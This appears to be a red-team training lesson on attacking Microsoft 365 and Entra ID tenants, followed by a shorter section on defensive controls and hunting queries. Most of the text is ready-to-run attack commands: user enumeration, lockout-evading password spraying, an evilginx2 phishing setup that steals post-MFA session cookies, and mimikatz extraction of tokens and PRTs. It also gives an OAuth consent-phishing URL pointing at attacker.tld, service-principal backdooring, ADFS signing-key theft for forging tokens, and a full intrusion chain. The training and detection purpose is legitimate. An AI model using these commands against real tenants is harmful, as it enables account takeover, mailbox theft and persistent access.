# Microsoft 365 & Entra ID Attacks

The corporate identity plane in 2026 isn't a domain controller — it's Entra ID (formerly Azure AD). Compromising it grants email, files, code, infrastructure, and federation into on-prem AD. This lesson covers the attack chains red teams actually run and the conditional-access geometry defenders need to get right.

> [!warning] Tenant-impact territory
> Run these only against tenants you own or have written authorization for. Token-replay against a real tenant outside scope is a federal-grade crime in most jurisdictions.

## The identity attack surface

![Entra ID Attack Surface](/images/lessons/entra_id_attack_surface_en.png)

## 1. Tenant recon (no creds yet)

```terminal
# Validate tenant exists, get tenant ID + federation type
curl 'https://login.microsoftonline.com/getuserrealm.srf?login=user@target.com&xml=1'
# → NameSpaceType: Federated / Managed → tells you whether ADFS is in front

# Tenant ID
curl 'https://login.microsoftonline.com/target.com/v2.0/.well-known/openid-configuration'

# AADInternals (PowerShell)
Get-AADIntLoginInformation -Domain target.com
Invoke-AADIntReconAsOutsider -Domain target.com
# Lists all federated/managed domains, MX records, MDI presence, sync status

# User enumeration via Microsoft Teams API (no auth)
o365creeper.py -f users.txt -o valid.txt
```

## 2. Password spraying

```terminal
# Rotate IPs to defeat smart-lockout per source-IP
fireprox -c -r us-east-2  # AWS API Gateway as proxy

msolspray --userlist users.txt --password 'Spring2026!' --proxy https://gateway/
# Tip: respect tenant smart-lockout; spray ≤ 1 password per 30 min per user
```

> [!tip] Smart Lockout, fully grasped
> Per user, per source-IP. Rotating source IPs keeps you under threshold per IP. Spraying one password every 30+ minutes keeps you under the per-user threshold. Best signal of defender skill: do they alert on **password sprays from rotating ASNs**, not just single-source brute force?

## 3. Adversary-in-the-Middle (AitM)

Defeats password + push/SMS MFA. Captures the post-MFA session cookie.

```terminal
# evilginx2
sudo ./evilginx2 -p ./phishlets
config domain login-target-365.com
config ip <PUBLIC_IP>
phishlets enable o365
lures create o365
# Send the lure URL via spear-phish; victim authenticates → ESTSAUTH cookie captured
```

After capture: import `ESTSAUTH`, `ESTSAUTHPERSISTENT`, `SignInStateCookie` into your browser → you're the user, MFA already satisfied for the session. Token has typically 24h–90d lifetime depending on settings.

## 4. Token theft post-foothold

If you have RCE on a workstation, pull tokens from the browser / Office apps directly:

```terminal
# Edge / Chromium token from disk (DPAPI-encrypted)
# Use the same user's session to decrypt:
mimikatz # dpapi::cookie /in:"C:\Users\alice\AppData\Local\Microsoft\Edge\User Data\Default\Network\Cookies"

# Office Token Cache
# Path: %LOCALAPPDATA%\Microsoft\TokenBroker\Cache
# TokenManager.exe (Microsoft) reads & refreshes; replay via roadtools
```

```terminal
# ROADtools — the canonical Entra red-team toolkit
pip install roadrecon roadtx
roadtx tokens --refresh-token <RT> --tenant <tenantid> --client 1b730954-1685-4b74-9bfd-dac224a7b894
roadtx aadgraph users --query "displayName,jobTitle" | jq
```

## 5. Conditional Access bypass mechanics

Conditional Access (CA) is a chain of "if X then require Y". Bypasses target the **device-compliance** and **legacy-protocol** edges:

| Bypass | Mechanic |
|--------|----------|
| Device compliance | Steal a Primary Refresh Token (PRT) from a compliant device → all CA passes |
| Approved client app | Use a client_id of a CA-exempt app (Exchange, Teams) |
| Trusted location | VPN / proxy chain into the trusted-CIDR |
| Legacy auth | If `Block legacy auth` not enabled, use IMAP/POP/SMTP basic auth |
| Service principal | App-only flow (client_credentials) is not subject to user CA |

```terminal
# Steal PRT from a domain-joined Windows host (after local admin)
mimikatz # sekurlsa::cloudap
# → ProofOfPossessionKey + PRT
roadtx prtenrich --prt <PRT> --prt-sessionkey <SK> --proxy <attacker-proxy>
roadtx browserprtauth --prt-cookie <COOKIE>
# Now you log into any CA-protected app as the user, FROM YOUR ATTACKER MACHINE,
# and CA evaluates the device as compliant.
```

## 6. OAuth consent phishing

```
https://login.microsoftonline.com/common/oauth2/v2.0/authorize?
  client_id=<EVIL_APP_GUID>
  &response_type=code
  &redirect_uri=https://attacker.tld/cb
  &scope=offline_access+Mail.ReadWrite+Files.ReadWrite.All+Sites.ReadWrite.All
  &state=...
```

User clicks → Microsoft consent prompt for legitimate-looking "ContosoAuditApp" → user approves → you receive an authorization code, exchange for refresh token, persist forever.

> [!danger] Refresh tokens persist past password changes
> A stolen refresh token is valid until revoked. Password reset alone does NOT invalidate it; you must revoke sessions: `Revoke-MgUserSignInSession -UserId <upn>`. Make this part of every user-compromise IR step.

## 7. Service principal abuse

```terminal
# After Global Admin / Application Admin compromise
# Add a credential to a high-privileged app:
roadtx app addcred --appid <victim-app-id>
# Or via PowerShell:
$cert = New-SelfSignedCertificate -Subject "CN=evil"
Connect-MgGraph -Scopes Application.ReadWrite.All
New-MgApplicationKey -ApplicationId <id> -KeyCredential @{ Type="AsymmetricX509Cert"; Usage="Verify"; Key=$cert.RawData }
# Now you can authenticate AS the app with your cert; survives any user password change.
```

## 8. Federation-key theft (Solorigate-style)

If you reach the on-prem ADFS server (compromised admin), you steal the token-signing certificate and forge SAML tokens for **any user**, **any tenant**:

```terminal
mimikatz # privilege::debug
# Extract DKM key + signing cert
ADFSDump.exe
# Use AADInternals to forge tokens
Open-AADIntOffice365Portal -ImmutableID <id> -Issuer "http://target.com/adfs/services/trust/"
```

Result: undetectable tenant-wide impersonation as long as the cert isn't rotated.

## 9. Cross-tenant access abuse

Cross-Tenant Access settings allow inbound trusts to other tenants. Misconfigured `Allow inbound MFA trust` from a guest tenant means an attacker who compromises Tenant B can act in Tenant A with B's MFA satisfying A's CA.

## End-to-end attack chain

```
1. Recon: target.com → Federated, ADFS at sts.target.com, MX 365.
2. Build user list (LinkedIn + leaks + GAL via undetected ASsumed-Identity if any guest access).
3. Spray "Spring2026!" via fireprox over 50 IPs, 1/30min/user.
4. 4 hits. One has MFA, three don't.
5. Use 1 non-MFA user → access OneDrive → find creds in shared docs.
6. Use creds with privileged role → add cred to OAuth app with Mail.Read.
7. Background app pulls all user mailboxes for 12 hours.
8. Pivot: find Azure subscription owner, use Cloud Shell, hit ARM resources.
9. Find AD Connect server in Azure VM, dump MSOL_<rand> cred → DCSync on-prem.
```

## Defender priorities

| Control | Why it matters |
|---------|---------------|
| **Phishing-resistant MFA** (FIDO2 / WHfB) for admins | Defeats AitM |
| **Block legacy auth** | Removes IMAP/POP/SMTP CA-bypass class |
| **Conditional Access: require compliant device** | Stops PRT theft from Hijacked machine — but hardens device path too |
| **Disable user consent for unverified apps** | Kills OAuth phishing class |
| **Tenant Restrictions v2** | Block outbound to attacker tenants |
| **Continuous Access Evaluation (CAE)** | Revokes tokens within minutes of risk events |
| **Token Protection / device binding** | Binds refresh tokens to TPM — replay from attacker host fails |
| **Monitor service principals** | Alert on new credentials added to apps with high-privilege scopes |

## Key hunting queries

```kql
// New OAuth app with high-privilege consent
AuditLogs
| where OperationName == "Add app role assignment grant to user"
| extend Scopes = tostring(parse_json(tostring(TargetResources[0].modifiedProperties))[0].newValue)
| where Scopes has_any ("Mail.ReadWrite","Files.ReadWrite.All","Directory.ReadWrite.All")
```

```kql
// PRT theft indicators (unusual device + token issuance pattern)
SigninLogs
| where AuthenticationDetails has "PRT"
| where DeviceDetail.deviceId == "" and ResultType == "0"
```

```kql
// Service principal authentication anomalies
AADServicePrincipalSignInLogs
| summarize Count=count(), IPs=dcount(IPAddress) by ServicePrincipalName, bin(TimeGenerated, 1h)
| where IPs > 3 or Count > 1000
```

> [!info] Identity is the new perimeter
> The single most cost-effective control in M365 / Entra is enforcing FIDO2-only sign-in for all role-bearing accounts and blocking legacy auth. If you do nothing else this quarter, do that.
